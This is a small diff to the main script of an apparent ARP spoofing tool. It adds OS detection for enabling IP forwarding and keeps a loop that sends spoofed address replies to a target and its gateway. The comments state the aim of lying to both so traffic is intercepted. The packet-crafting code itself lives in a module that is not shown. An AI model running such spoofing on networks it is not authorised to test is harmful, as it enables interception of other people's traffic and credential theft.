@@ -2,7 +2,7 @@ from spoofing_services import *
 from argparse import *
 import time
 import sys
-import os
+import platform
 
 
 def parse_args():
@@ -34,17 +34,17 @@ def parse_args():
 
 
 def main():
+    os = platform.system()
     args = parse_args()
     target_ip = args.target_ip
     gateway_ip = args.gateway_ip
     con_mode = args.con_mode
 
-    enableIPRoute("Windows")
+    enableIPRoute(os)
 
     try:
         spoofer = Spoofer(con_mode)
         while True:
-            # spoof(target_ip, gateway_ip)    # lie to the target saying that we are the gateway
             spoofer.spoof(target_ip, gateway_ip)    # like to the target saying that the gateway's IP is a non-existent one
             spoofer.spoof(gateway_ip, target_ip)    # lie to the gateway saying that we are the target
             time.sleep(1)
